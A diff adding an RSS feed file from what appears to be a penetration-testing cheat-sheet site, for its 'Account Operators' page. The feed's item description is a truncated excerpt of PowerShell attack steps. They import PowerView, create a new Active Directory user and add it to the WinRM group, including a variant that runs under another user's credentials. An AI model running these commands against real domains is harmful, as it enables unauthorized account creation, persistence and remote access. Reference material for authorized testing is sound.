@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Account Operators on TLDRBins</title>
+    <link>https://tldrbins.github.io/@account-operators/</link>
+    <description>Recent content in Account Operators on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@account-operators/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Account Operators</title>
+      <link>https://tldrbins.github.io/account_operators/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/account_operators/</guid>
+      <description>Import PowerView.ps1 . .\PowerView.ps1 Create New User Account Authenticated $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} # Create new user New-AdUser new_user -enabled $true -accountpassword $secstr # Grant new user privilege (e.g. WinRM) Add-DomainGroupMember -Identity WinRM -Members &amp;#39;new_user&amp;#39; Runas $username = &amp;#34;domain\username&amp;#34; $password = &amp;#34;password&amp;#34; $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr # Create new user New-AdUser new_user -credential $cred -enabled $true -accountpassword $secstr # Grant new user privilege (e.</description>
+    </item>
+  </channel>
+</rss>
